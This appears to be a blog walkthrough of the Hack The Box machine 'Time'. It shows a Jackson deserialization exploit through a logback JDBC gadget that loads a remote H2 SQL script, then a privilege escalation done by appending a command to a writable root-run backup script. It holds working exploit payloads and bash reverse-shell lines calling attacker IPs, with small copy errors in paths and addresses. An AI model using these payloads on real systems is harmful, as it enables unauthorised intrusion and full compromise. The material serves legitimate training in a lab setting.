title: Time - Walkthrough
---

Time was all about research. The enumeration part is pretty straight forward, but the real challenge is to be able to filter results properly. Once you get the right exploit, it's easy to get the foothold and root part is a classic of privesc. I enjoyed that box !

## Recon
As usual, I start with a quick Nmap followed by a full scan with the default script (-C) and the -V tag to get more info about the services.

{% highlight sh %}
sudo nmap time && sudo nmap -sCV -p- time -oN nmap
{% endhighlight %}

We only have SSH and HTTP open. Also I note the apache version `2.4.41`. 

By having a look a the website, I can see that, as the title says, it is some kind of <strong><cite>JSON</cite></strong> parser. 
There are 2 main functions:

1. Beautify
2. Validate

If I take some json strings and try the beautify function, everything seems to work fine. But, if I try the `validate` function, I get a error message. 

>Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object

Interesting ! We have some valuable information there. Now we know that the back-end uses 
<strong><cite>Java</cite></strong> to validate the <strong><cite>JSON</cite></strong> string. Moreover, it uses the [jackson](https://github.com/FasterXML/jackson) library to parse the data. So, I guess I can try googling that and see if I can find some juicy exploit out there.

## Foothold / User

There are quite a lot of great articles on the net about <strong><cite>Jackson exploitation</cite></strong>. To narrow down my results, I did a quick search on the `Apache version 2.4.41`. That specific version has been released around mid 2019 so I think that I can filter my results on google with that specific year. 
Now it is way easier to find out what exploit should I use and I've found a great [article](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html) about deserialization in Jackson library. 

>  When Jackson deserializes ch.qos.logback.core.db.DriverManagerConnectionSource, this class can be abused to instantiate a JDBC connection. JDBC stands for (J)ava (D)ata(b)ase (C)onnectivity. JDBC is a Java API to connect and execute a query with the database and it is a part of JavaSE (Java Standard Edition). Moreover, JDBC uses an automatic string to class mapping, as such it is a perfect target to load and execute even more “gadgets” inside the chain.

The idea here is to create a SSRF attack to force the server to execute a request on our machine and execute a malicious payload.
Because the vulnerability uses JDBC, we need to craft a payload in sql format. 

[Other Linke](http://www.hackdig.com/09/hack-137165.htm)

I'm gonna make a quick test by setting up a listener on my machine and send a payload via curl. 

{% highlight sh %}
nc -lvnp 2222
{% endhighlight %}

{% highlight text %}
curl -X POST http://time -d 'mode=2&data=["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:tcp://10.10.14.10:2222/"}]'
{% endhighlight %}

We got an answer ! So we can control the request that is made be the remote server. 

{% highlight text %}
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::2222
Ncat: Listening on 0.0.0.0:2222
Ncat: Connection from 10.10.10.214.
Ncat: Connection from 10.10.10.214:40774.
	jdbc:h2:tcp://10.10.14.10:2222/����^C
{% endhighlight %}

Now all we need to do is to ask the server to request our payload and execute it. 

1. Create the sql payload as seen in the POC and save it as `exp.sql`.

>CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
>        String[] command = {"bash", "-c", cmd};
>        java.util.Scanner s = new >java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A">);
>        return s.hasNext() ? s.next() : "";  }
>$$;
>CALL SHELLEXEC('bash -i >& /dev/tcp/192.168.136.129/7777 0>&1')

2. Set up a python server

{% highlight sh %}
sudo python -m http.server 80
{% endhighlight %}

3. Set up a listener 
{% highlight sh %}
nc -lvnp 2222
{% endhighlight %}

4. Send the payload to the target machine. 

- First I url encoded my payload
> ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.10/exp.sql'"}]

To

> %5B%22ch.qos.logback.core.db.DriverManagerConnectionSource%22%2C+%7B%22url%22%3A%22jdbc%3Ah2%3Amem%3A%3BTRACE_LEVEL_SYSTEM_OUT%3D3%3BINIT%3DRUNSCRIPT+FROM+%27http%3A%2F%2F10.10.14.10%2Fexp.sql%27%22%7D%5D

Then send it !
{% highlight text %}
curl -X POST http://time -d 'mode=2&data=%5B%22ch.qos.logback.core.db.DriverManagerConnectionSource%22%2C+%7B%22url%22%3A%22jdbc%3Ah2%3Amem%3A%3BTRACE_LEVEL_SYSTEM_OUT%3D3%3BINIT%3DRUNSCRIPT+FROM+%27http%3A%2F%2F10.10.14.10%2Fexp.sql%27%22%7D%5D'
{% endhighlight %}



Voila ! We have a foothold.

uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)

The `user.txt` is inside Pericles home directory. 

## Root

I made a bit of enumeration but I didn't find anything useful. What I like to do is monitoring the processes on the box using <strong><cite>pspy64</cite></strong>. So, I uploaded and executed it on the box. 
I've directly seen that a shell script is invoked by the root user every 10 seconds.

2020/12/01 13:36:32 CMD: UID=0    PID=4109   | /bin/bash /usr/bin/timer_backup.sh
{% endhighlight %}

Let's check the permissions on that file. 

{% highlight sh %}
ls -ld /usr/bin/timer_backup.sh
{% endhighlight %}
{% highlight text %}
rwxrw-rw- 1 pericles pericles 88 Dec  1 13:35 /usr/bin/timer_backup.sh
{% endhighlight %}

We have write permissions so, I can just modify that file by adding a bash command to get a shell. 

{% highlight sh %}
echo 'bash -i >& /dev/tcp/10.10.14.10/3333 0>&1' >> /usr/bin/timer_backup/sh
{% endhighlight %}

Then, set up a new listener on my local machine. 

{% highlight sh %}
nc -lvnp 3333
{% endhighlight %}

And we have a root shell. 

{% highlight sh %}
uid=0(root) gid=0(root) groups=0(root)
{% endhighlight %}

<strong>Rooted ;)</strong>
